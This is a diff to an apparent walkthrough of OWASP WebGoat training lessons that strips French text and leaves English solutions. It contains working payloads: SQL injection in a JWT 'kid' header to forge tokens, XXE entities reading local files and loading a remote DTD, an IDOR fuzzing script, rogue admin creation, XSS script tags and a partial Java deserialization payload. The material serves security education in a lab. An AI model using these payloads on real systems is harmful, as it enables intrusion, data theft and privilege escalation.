-![Warning](images/wiki_owasp_webgoat/warning.png)  Le numéro de leçon ne devient pas vert après validation.  Lesson number does not turn green on validation.. 
+![Warning](images/wiki_owasp_webgoat/warning.png)  It lacks a precision in the hints: the key is decoded as a base64 chain. Also instead of using as **kid** `hacked' UNION select 'deletingTom' from INFORMATION_SCHEMA.SYSTEM_USERS --`, you have to use `hacked' UNION select 'ZGVsZXRpbmdUb20=' from INFORMATION_SCHEMA.SYSTEM_USERS --`   
+![Warning](images/wiki_owasp_webgoat/warning.png)  Lesson number does not turn green on validation.. 
 
 ![Hint](images/wiki_owasp_webgoat/hint.png) Take a look at the token and specifically and the header  
 ![Hint](images/wiki_owasp_webgoat/hint.png) The 'kid' (key ID) header parameter is a hint indicating which key was used to secure the JWS  
@@ -555,16 +562,47 @@ jwt_tokens_5()
 ![Hint](images/wiki_owasp_webgoat/hint.png) Using a SQL injection you might be able to manipulate the key to something you know and create a new token.  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Use: hacked' UNION select 'deletingTom' from INFORMATION\_SCHEMA.SYSTEM\_USERS -- as the kid in the header and change the contents of the token to Tom and hit the endpoint with the new token
 
-*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_. Open the _Development Tools_ in the browser, and go to the _Network_ tab.
-*   Sur WebGoat, cliquer sur **Delete**. On WebGoat, click on **Delete**.
-*   Repérer la requête vers `delete` dans l'onglet _Réseau_ et cliquer sur _En-têtes_. Locate the query to `delete` in the _Network_ tab and click on _Headers_.
-*   Remarquer le paramètre `token=eyJ0eXAiOiJKV1QiLCJraWQiOiJ3ZWJnb2F0X2tleSIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiSmVycnkiLCJFbWFpbCI6ImplcnJ5QHdlYmdvYXQuY29tIiwiUm9sZSI6WyJDYXQiXX0.CgZ27DzgVW8gzc0n6izOU638uUCi6UhiOJKYzoEZGE8`. Notice the `token=eyJ0eXAiOiJKV1QiLCJraWQiOiJ3ZWJnb2F0X2tleSIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiSmVycnkiLCJFbWFpbCI6ImplcnJ5QHdlYmdvYXQuY29tIiwiUm9sZSI6WyJDYXQiXX0.CgZ27DzgVW8gzc0n6izOU638uUCi6UhiOJKYzoEZGE8`.
-*   En base64, cela se décode en : `{"typ":"JWT","kid":"webgoat_key","alg":"HS256"}.{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"jerry@webgoat.com","username":"Jerry","Email":"jerry@webgoat.com","Role":["Cat"]}.signature`. In base64, this is decoded as: `{"typ":"JWT","kid":"webgoat_key","alg":"HS256"}.{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"jerry@webgoat.com","username":"Jerry","Email":"jerry@webgoat.com","Role":["Cat"]}.signature`.
-*   Modifier les deux premières parties du token en `{"typ":"JWT","kid":"hacked' UNION select 'ZGVsZXRpbmdUb20=' from INFORMATION_SCHEMA.SYSTEM_USERS --","alg":"HS256"}` et `{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"jerry@webgoat.com","username":"Tom","Email":"jerry@webgoat.com","Role":["Cat"]}`, puis recalculer la signature avec la clé `deletingTom`, avec le script Python ci-dessous par exemple. Edit the first two parts of the token as `{"typ":"JWT","kid":"hacked' UNION select 'ZGVsZXRpbmdUb20=' from INFORMATION_SCHEMA.SYSTEM_USERS --","alg":"HS256"}` et `{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"jerry@webgoat.com","username":"Tom","Email":"jerry@webgoat.com","Role":["Cat"]}`, then calculate the new signature with `deletingTom` as the new key. Use the Python script below for example.
-*   Le nouveau token est `eyJ0eXAiOiJKV1QiLCJraWQiOiJoYWNrZWQnIFVOSU9OIHNlbGVjdCAnWkdWc1pYUnBibWRVYjIwPScgZnJvbSBJTkZPUk1BVElPTl9TQ0hFTUEuU1lTVEVNX1VTRVJTIC0tIiwiYWxnIjoiSFMyNTYifQ.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiVG9tIiwiRW1haWwiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsIlJvbGUiOlsiQ2F0Il19.JrDpQmNiVI818UvOMQgRmPkZOetw7Ic1WbPvStS2B6U`. The new token is `eyJ0eXAiOiJKV1QiLCJraWQiOiJoYWNrZWQnIFVOSU9OIHNlbGVjdCAnWkdWc1pYUnBibWRVYjIwPScgZnJvbSBJTkZPUk1BVElPTl9TQ0hFTUEuU1lTVEVNX1VTRVJTIC0tIiwiYWxnIjoiSFMyNTYifQ.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiVG9tIiwiRW1haWwiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsIlJvbGUiOlsiQ2F0Il19.JrDpQmNiVI818UvOMQgRmPkZOetw7Ic1WbPvStS2B6U`.
-*   Cliquer sur _Modifier et Renvoyer_, modifier le paramètre avec la nouvelle valeur générée, et renvoyer la requête. Click on _Modify and Resend_, modify the token with the newly generated parameter and send again the request.
-
+*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
+*   On WebGoat, click on **Delete**.
+*   Locate the query to `delete` in the _Network_ tab and click on _Headers_.
+*   Notice the parameter:
 ```
+token=eyJ0eXAiOiJKV1QiLCJraWQiOiJ3ZWJnb2F0X2tleSIsImFsZyI6IkhTMjU2In0.eyJpc3MiOi
+JXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYX
+VkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiSmVycn
+kiLCJFbWFpbCI6ImplcnJ5QHdlYmdvYXQuY29tIiwiUm9sZSI6WyJDYXQiXX0.CgZ27DzgVW8gzc0n6i
+zOU638uUCi6UhiOJKYzoEZGE8
+```
+*   In base64, this is decoded as:
+```
+{"typ":"JWT","kid":"webgoat_key","alg":"HS256"}.{"iss":"WebGoat Token Builder",
+"iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"jerry@webgoat.com",
+"username":"Jerry","Email":"jerry@webgoat.com","Role":["Cat"]}.signature
+```
+*   Edit the first two parts of the token as
+```
+{"typ":"JWT","kid":"hacked' UNION select 'ZGVsZXRpbmdUb20=' from 
+INFORMATION_SCHEMA.SYSTEM_USERS --","alg":"HS256"}
+```
+and
+```
+{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,
+"aud":"webgoat.org","sub":"jerry@webgoat.com","username":"Tom",
+"Email":"jerry@webgoat.com","Role":["Cat"]}
+```
+then calculate the new signature with deletingTom as the new key. Use the Python script below for example. 
+*   The new token is
+```
+eyJ0eXAiOiJKV1QiLCJraWQiOiJoYWNrZWQnIFVOSU9OIHNlbGVjdCAnWkdWc1pYUnBibWRVYjIwPScg
+ZnJvbSBJTkZPUk1BVElPTl9TQ0hFTUEuU1lTVEVNX1VTRVJTIC0tIiwiYWxnIjoiSFMyNTYifQ.eyJpc
+3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwN
+CwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiV
+G9tIiwiRW1haWwiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsIlJvbGUiOlsiQ2F0Il19.JrDpQmNiVI818UvO
+MQgRmPkZOetw7Ic1WbPvStS2B6U
+```
+*   Click on _Modify and Resend_, modify the token with the newly generated parameter and send again the request.
+
+```python
 import base64  
 import hashlib  
 import hmac  
@@ -595,10 +633,10 @@ jwt_tokens_8()
 2.  
 ![Warning](images/wiki_owasp_webgoat/warning.png)  Le numéro de leçon ne devient pas vert après validation.  Lesson number does not turn green on validation.. 
 
-*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_. Open the _Development Tools_ in the browser, and go to the _Network_ tab.
-*   Sur WebGoat, cliquer sur **Log in**. On WebGoat, click on **Log in**.
-*   Repérer la requête vers `start.mvc` dans l'onglet _Réseau_ et cliquer sur _Paramètres_. Locate the query to `start.mc` in the _Network_ tab and click on _Parameters_.
-*   Remarquer les paramètres `{"username":"CaptainJack","password":"BlackPearl"}`. Notice the parameters `{"username":"CaptainJack","password":"BlackPearl"}`.
+*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
+*   On WebGoat, click on **Log in**.
+*   Locate the query to `start.mc` in the _Network_ tab and click on _Parameters_.
+*   Notice the parameters `{"username":"CaptainJack","password":"BlackPearl"}`.
 
 #### **(A4) XML External Entities (XXE):**
 
@@ -612,10 +650,10 @@ jwt_tokens_8()
 ![Hint](images/wiki_owasp_webgoat/hint.png) Do not forget to reference the entity  
 ![Hint](images/wiki_owasp_webgoat/hint.png) In the comment you should references: <comment><text>&root;test</text></comment>
 
-*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_. Open the _Development Tools_ in the browser, and go to the _Network_ tab.
-*   Sur WebGoat, poster un commentaire. On WebGoat, post a comment.
-*   Repérer la requête vers `simple` dans l'onglet _Réseau_ et cliquer sur _Modifier et renvoyer_. Locate the query to `simple` in the _Network_ tab and click on _Edit and Resend_.
-*   Modifier le corps de la requête en : `<?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>`. Edit the body with: `<?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>`.
+*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
+*   On WebGoat, post a comment.
+*   Locate the query to `simple` in the _Network_ tab and click on _Edit and Resend_.
+*   Edit the body with: `<?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>`.
 
 ![XXE 3](images/wiki_owasp_webgoat/xxe-3.png)
 
@@ -623,14 +661,14 @@ jwt_tokens_8()
 ![Hint](images/wiki_owasp_webgoat/hint.png) Take a look at the content type  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Does the endpoint only accept json messages?
 
-*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_. Open the _Development Tools_ in the browser, and go to the _Network_ tab.
-*   Sur WebGoat, poster un commentaire. On WebGoat, post a comment.
-*   Repérer la requête vers `content-type` dans l'onglet _Réseau_ et cliquer sur _Modifier et renvoyer_. Locate the query to `content-type` in the _Network_ tab and click on _Edit and Resend_.
-*   Modifier le corps de la requête en : `<?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>`, et modifier l'en-tête `Content-Type: application/json` en `Content-Type: application/xml`. Edit the body with: `<?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>`. and edit the header `Content-Type: application/json` with `Content-Type: application/xml`.
+*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
+*   On WebGoat, post a comment.
+*   Locate the query to `content-type` in the _Network_ tab and click on _Edit and Resend_.
+*   Edit the body with: `<?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>`. and edit the header `Content-Type: application/json` with `Content-Type: application/xml`.
 
 ![XXE 4](images/wiki_owasp_webgoat/xxe-4.png)
 
-6. Même si ce n'est pas un challenge, une petite erreur s'est glissée dans la leçon, faire attention à rentrer les bonnes URL pour pouvoir effectuer le test. 6\. Although it is not a challenge, a small mistake has crept into the lesson, be careful to enter the right URL to be able to perform the test.  
+6. Although it is not a challenge, a small mistake has crept into the lesson, be careful to enter the right URL to be able to perform the test.  
   
 **attack.dtd**  
 ```
@@ -657,11 +695,11 @@ jwt_tokens_8()
 ![Hint](images/wiki_owasp_webgoat/hint.png) An example DTD can be found here WebGoat/images/example.dtd, include this DTD in the xml comment  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Use for the comment, be aware to replace the url accordingly: <?xml version="1.0"?><!DOCTYPE comment \[<!ENTITY % remote SYSTEM "http://localhost:9090/files/test1234/test.dtd">%remote;\]><comment><text>test&send;</text></comment>
 
-*   Envoyer le fichier **contents\_file.dtd** vers **WebWolf**. Upload **contents\_file.dtd** on **WebWolf**.
-*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_. Open the _Development Tools_ in the browser, and go to the _Network_ tab.
-*   Sur WebGoat, poster un commentaire. On WebGoat, post a comment.
-*   Repérer la requête vers `blind` dans l'onglet _Réseau_ et cliquer sur _Modifier et renvoyer_. Locate the query to `blind` in the _Network_ tab and click on _Edit and Resend_.
-*   Modifier le corps de la requête comme spécifié ci-dessous. Edit the body of the query as specified below.
+*   Upload **contents\_file.dtd** on **WebWolf**.
+*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
+*   On WebGoat, post a comment.
+*   Locate the query to `blind` in the _Network_ tab and click on _Edit and Resend_.
+*   Edit the body of the query as specified below.
 
 **contents\_file.dtd**  
 ```
@@ -690,26 +728,26 @@ jwt_tokens_8()
 2.  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Log in first. User Name is tom, password is cat.
 
-S'indentifier avec les identifiants fournis. Identify with the provided credentials.
+Identify with the provided credentials.
 
 3.  
-![Warning](images/wiki_owasp_webgoat/warning.png)  Le numéro de leçon ne devient pas vert après validation.  Lesson number does not turn green on validation. 
+![Warning](images/wiki_owasp_webgoat/warning.png)  Lesson number does not turn green on validation. 
 
 ![Hint](images/wiki_owasp_webgoat/hint.png) Make sure you have logged in on the previous step/page  
 ![Hint](images/wiki_owasp_webgoat/hint.png) View the response using developer tools or a proxy.  
 ![Hint](images/wiki_owasp_webgoat/hint.png) The attributes are not visible and have nothing to do with size, color or name
 
-Les attributs attendus sont : **role**, **userID**. Attributes are: **role**, **userID**.
+Attributes are: **role**, **userID**.
 
 4.  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Look at the previous request for profile, this is similar  
 ![Hint](images/wiki_owasp_webgoat/hint.png) You will need data from the previous request for your own profile  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Append your id to the previous request (i.e. .../profile/{yourId})
 
-*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_. Open the _Development Tools_ in the browser, and go to the _Network_ tab.
-*   Dans la leçon 3, cliquer sur **View Profile**. In the lesson 3, click on **View Profile**.
-*   Repérer la requête vers `profile` dans l'onglet _Réseau_ et cliquer sur _Réponse_. Locate the query to `blind` in the _Network_ tab and click on _Response_.
-*   Remarque le paramètre **userID**, la réponse attendue est **WebGoat/IDOR/profile/userID\_value**. Notice the paramter **userID**, the expected answer is **WebGoat/IDOR/profile/userID\_value**.
+*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
+*   In the lesson 3, click on **View Profile**.
+*   Locate the query to `blind` in the _Network_ tab and click on _Response_.
+*   Notice the paramter **userID**, the expected answer is **WebGoat/IDOR/profile/userID\_value**.
 
 ![IDOR 4](images/wiki_owasp_webgoat/idor-4.png)
 
@@ -725,9 +763,9 @@ Les attributs attendus sont : **role**, **userID**. Attributes are: **role**, **
 ![Hint](images/wiki_owasp_webgoat/hint.png) Your payload should look something like ... {"role" : 1,"color" : "red","size" : "small","name" : "Tom Cat","userId" : "2342388"}
 
 **View Another Profile**:  
-Le script ci-dessous permet de _fuzzer_ l'URL trouvée dans l'exercice précédent pour trouver un autre profil. On en trouve un ayant pour **id** 2342388. The script below _fuzz_ the URL found in the previous exercise to find another profile. We find one at 2342388.
+The script below _fuzz_ the URL found in the previous exercise to find another profile. We find one at 2342388.
 
-```
+```python
 import requests  
   
 def idor_5():  
@@ -749,7 +787,7 @@ idor_5()
 ```
 
 **Edit Another Profile**:  
-Envoyer une requête PUT vers http://192.168.99.100:8080/WebGoat/IDOR/profile/2342388 avec pour en-tête `Content-Type: application/json` et pour corps `{"role":1, "color":"red", "size":"large", "name":"Buffalo Bill", "userId":2342388}` Send a PUT request to http://192.168.99.100:8080/WebGoat/IDOR/profile/2342388 with header `Content-Type: application/json` and body `{"role":1, "color":"red", "size":"large", "name":"Buffalo Bill", "userId":2342388}`
+Send a PUT request to http://192.168.99.100:8080/WebGoat/IDOR/profile/2342388 with header `Content-Type: application/json` and body `{"role":1, "color":"red", "size":"large", "name":"Buffalo Bill", "userId":2342388}`
 
 ##### Missing Function Level Access Control
 
@@ -758,8 +796,8 @@ Envoyer une requête PUT vers http://192.168.99.100:8080/WebGoat/IDOR/profile/23
 ![Hint](images/wiki_owasp_webgoat/hint.png) Look for indications of something that would not be available to a typical user  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Look for something a super-user or administator might have available to them
 
-*   Effectuer un clic-droit sur l'élément **Log Out**, et cliquer sur _Examiner l'élément_. Right-click on the **Log Out** element, and click on _Inspect Element_
-*   Juste en dessous dans le HTML, on trouve des champs cachés, dont les champs : **Users**, **Config**. Just below in the HTML, we can see hidden fields: **Users**, **Config**.
+*   Right-click on the **Log Out** element, and click on _Inspect Element_
+*   Just below in the HTML, we can see hidden fields: **Users**, **Config**.
 
 ![MFLAC 2](images/wiki_owasp_webgoat/mflac-2.png)
 
@@ -777,11 +815,11 @@ Envoyer une requête PUT vers http://192.168.99.100:8080/WebGoat/IDOR/profile/23
 ![Hint](images/wiki_owasp_webgoat/hint.png) OK, here it is. First, create an admin user ... Change the method to POST, change the content-type to "application/json". And your payload should look something like: {"username":"newUser2","password":"newUser12","matchingPassword":"newUser12","role":"WEBGOAT\_ADMIN"}  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Now log in as that user and bring up WebGoat/users. Copy your hash and log back in to your original account and input it there to get credit.
 
-*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_. Open the _Development Tools_ in the browser, and go to the _Network_ tab.
-*   Aller sur http://host:port/WebGoat/users. Go to http://host:port/WebGoat/users.
-*   Repérer la requête vers `users` dans l'onglet _Réseau_ et cliquer sur _Modifier et Renvoyer_. Locate the query to `users` in the _Network_ tab and click on _Edit and Resend_.
-*   Ajouter l'en-tête `Content-Type: application/json`. Add the header `Content-Type: application/json`.
-*   Récupérer le _hash_ en réponse. Check the hash in the response.
+*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
+*   Go to http://host:port/WebGoat/users.
+*   Locate the query to `users` in the _Network_ tab and click on _Edit and Resend_.
+*   Add the header `Content-Type: application/json`.
+*   Check the hash in the response.
 
 ![MFLAC 3](images/wiki_owasp_webgoat/mflac-3.png)
 
@@ -789,11 +827,12 @@ Envoyer une requête PUT vers http://192.168.99.100:8080/WebGoat/IDOR/profile/23
 
 #### **(A7) Cross-Site Scripting (XSS):**
 
-![Warning](images/wiki_owasp_webgoat/warning.png)  Dans le panneau à gauche, la _checkbox_ verte qui est censée apparait après complétion de l'ensemble des leçons d'un sujet n'apparait pour aucune des trois leçons.  In the left panel, the green checkbox that is supposed to appear after completing all the lessons of a topic does not appear for any of the three lessons. 
+![Warning](images/wiki_owasp_webgoat/warning.png)  In the left panel, the green checkbox that is supposed to appear after completing all the lessons of a topic does not appear for any of the three lessons. 
 
 ##### Cross Site Scripting
 
-2\. Les principaux navigateurs ont banni le Javascript de la barre d'URL, contrairement à ce que laisse penser la consigne. Ouvrir plutôt les _Outils de développements_, et l'onglet _Console_. La réponse attendue est `Yes`. 2\. The main browsers have banned Javascript from the URL bar, contrary to what the suggestion say. Open the _Development Tools_, and the _Console_ tab instead. The expected answer is `Yes`.
+2. 
+Main browsers have banned Javascript from the URL bar, contrary to what the suggestion say. Open the _Development Tools_, and the _Console_ tab instead. The expected answer is `Yes`.
 
 7.  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Think about how the inputs are presumably processed by the application.  
@@ -801,7 +840,7 @@ Envoyer une requête PUT vers http://192.168.99.100:8080/WebGoat/IDOR/profile/23
 ![Hint](images/wiki_owasp_webgoat/hint.png) What information send to the application gets reflected back after being submitted?  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Just try purchasing something. You want your script to be included in the purchase-confirmation.
 
-Entrer `<script>alert()</script>` dans la case **Enter your credit card number:**. Put `<script>alert()</script>` in the box **Enter your credit card number:**.
+Put `<script>alert()</script>` in the box **Enter your credit card number:**.
 
 10.  
 ![Hint](images/wiki_owasp_webgoat/hint.png) To search through the client side code, use the developer tools of your browser. (If you don't know how to use them, check the Developer Tools Lesson in the general category.)  
@@ -809,10 +848,10 @@ Entrer `<script>alert()</script>` dans la case **Enter your credit card number:*
 ![Hint](images/wiki_owasp_webgoat/hint.png) Make sure you add the base route at the start, when submitting your solution.  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Still did not find it? Check the GoatRouter.js file. It should be pretty easy to determine.
 
-*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Débogueur_. Open the _Development Tools_ in the browser, and go to the _Debugger_ tab.
-*   Repérer le fichier `goatApp/View/GoatRouter.js` et l'ouvrir. Locate the `goatApp/View/GoatRouter.js` file and open it.
-*   Recherchez le mot **routes** dans le fichier pour tomber sur `'test/:param': 'testRoute'`. Look for **routes** to find `'test/:param': 'testRoute'`.
-*   La réponse attendue est alors `start.mvc#test/`. The expected answer is then `start.mvc#test/`.
+*   Open the _Development Tools_ in the browser, and go to the _Debugger_ tab.
+*   Locate the `goatApp/View/GoatRouter.js` file and open it.
+*   Look for **routes** to find `'test/:param': 'testRoute'`.
+*   The expected answer is then `start.mvc#test/`.
 
 ![XSS 10](images/wiki_owasp_webgoat/xss-10.png)
 
@@ -824,9 +863,9 @@ Entrer `<script>alert()</script>` dans la case **Enter your credit card number:*
 ![Hint](images/wiki_owasp_webgoat/hint.png) Since you are working with an URL, you might have to URL-encode your parameters.  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Replace '/' with '%2F' in your URL parameters.
 
-*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Console_. Open the _Development Tools_ in the browser, and go to the _Console_ tab.
-*   Naviguer vers l'URL [http://host:port/WebGoat/start.mvc#test/<script>webgoat.customjs.phoneHome()<%2Fscript>](http://host:port/WebGoat/start.mvc#test/<script>webgoat.customjs.phoneHome()<%2Fscript>) Navigate to the URL [http://host:port/WebGoat/start.mvc#test/<script>webgoat.customjs.phoneHome()<%2Fscript>](http://host:port/WebGoat/start.mvc#test/<script>webgoat.customjs.phoneHome()<%2Fscript>)
-*   Récupérer le numéro en sortie de la fonction. Retrieve the number in the function output.
+*   Open the _Development Tools_ in the browser, and go to the _Console_ tab.
+*   Navigate to the URL [[http://host:port/WebGoat/start.mvc#test/&lt;script&gt;webgoat.customjs.phoneHome()&lt;%2Fscript&gt;](http://host:port/WebGoat/start.mvc#test/&lt;script&gt;webgoat.customjs.phoneHome()&lt;%2Fscript&gt;).
+*   Retrieve the number in the function output.
 
 ![XSS 11](images/wiki_owasp_webgoat/xss-11.png)
 
@@ -854,9 +893,9 @@ Solution 4: No there are many other ways. Like HTML, Flash or any other type of 
 ##### Cross Site Scripting (stored)
 
 3.
-*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Console_. Open the _Development Tools_ in the browser, and go to the _Network_ tab.
-*   Poster `<script>webgoat.customjs.phoneHome()</script>` en commentaire. Comment with `phoneHome Response is <script>webgoat.customjs.phoneHome()</script>`.
-*   Récupérer le numéro en sortie de la fonction. Retrieve the number in the function output.
+*   Open the _Development Tools_ in the browser, and go to the _Network_ tab.
+*   Comment with `phoneHome Response is <script>webgoat.customjs.phoneHome()</script>`.
+*   Retrieve the number in the function output.
 
 ![XSS Stored 3](images/wiki_owasp_webgoat/xss-stored-3.png)
 
@@ -868,16 +907,16 @@ Solution 4: No there are many other ways. Like HTML, Flash or any other type of 
 ![Hint](images/wiki_owasp_webgoat/hint.png) Take a look at OWASP Java Encoder Project.  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Do not forget to reference the tag libs and choose "e" as prefix.
 
-*   La première ligne doit contenir : `<%@ taglib uri="https://www.owasp.org/index.php/OWASP_Java_Encoder_Project" %>` The first line shoud contain: `<%@ taglib uri="https://www.owasp.org/index.php/OWASP_Java_Encoder_Project" %>`
-*   Remplacer `<%= request.getParameter("first_name")%>` par `${e:forHtml(param.first_name)}`. Replace `<%= request.getParameter("first_name")%>` with `${e:forHtml(param.first_name)}`.
-*   Remplacer `<%= request.getParameter("last_name")%>` par `${e:forHtml(param.last_name)}`. Replace `<%= request.getParameter("last_name")%>` with `${e:forHtml(param.last_name)}`.
+*   The first line shoud contain: `<%@ taglib uri="https://www.owasp.org/index.php/OWASP_Java_Encoder_Project" %>`
+*   Replace `<%= request.getParameter("first_name")%>` with `${e:forHtml(param.first_name)}`.
+*   Replace `<%= request.getParameter("last_name")%>` with `${e:forHtml(param.last_name)}`.
 
 6.  
 ![Hint](images/wiki_owasp_webgoat/hint.png) Try to have a look at the AntiSamy documentation.
 
-Le code suivant permet de valider la leçon. The following code validate the lesson.
+The following code validate the lesson.
 
-```
+```java
 import org.owasp.validator.html.*;  
 import MyCommentDAO;  
   
@@ -896,26 +935,99 @@ public class AntiSamyController {
 ##### Insecure Deserialization
 
 5.  
-![Warning](images/wiki_owasp_webgoat/warning.png)  Je n'ai pas réussi à valider la leçon, ci-dessous, quelques pistes de recherche.  I could'nt validate the lesson, you can find my search below. 
+![Warning](images/wiki_owasp_webgoat/warning.png)  I could'nt validate the lesson, you can find my search below. 
 
-*   Le package à utiliser pour déclencher la faille serait Hibernate 5. The package to use to trigger the flaw seems to be Hibernate 5.
-*   Le payload suivant, trouvé dans un [module](https://github.com/federicodotta/Java-Deserialization-Scanner/blob/master/src/burp/BurpExtender.java) de Burp Suite fonctionne, mais déclenche un _sleep_ de 10 secondes: The following payload, found in a [Burp Suite module](https://github.com/federicodotta/Java-Deserialization-Scanner/blob/master/src/burp/BurpExtender.java) works but triggers a 10 seconds sleep.
-*   La [bibliothèque ysoserial](https://github.com/frohoff/ysoserial) semble être une piste de recherche aussi. The [ysoserial library](https://github.com/frohoff/ysoserial) seems to be a search track too.
+*   The package to use to trigger the flaw seems to be Hibernate 5.
+*   The following payload, found in a [Burp Suite module](https://github.com/federicodotta/Java-Deserialization-Scanner/blob/master/src/burp/BurpExtender.java) works but triggers a 10 seconds sleep.
+*   The [ysoserial library](https://github.com/frohoff/ysoserial) seems to be a search track too.
 
-`rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGV-e2Nh9AnXEQIADVoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7WwAhcHJvcGVydHlWYWx1ZUdlbmVyYXRpb25TdHJhdGVnaWVzdAAmW0xvcmcvaGliZXJuYXRlL3R1cGxlL1ZhbHVlR2VuZXJhdGlvbjtMAAl0eXBlU2NvcGV0ACpMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGVGYWN0b3J5JFR5cGVTY29wZTt4cgAfb3JnLmhpYmVybmF0ZS50eXBlLkFic3RyYWN0VHlw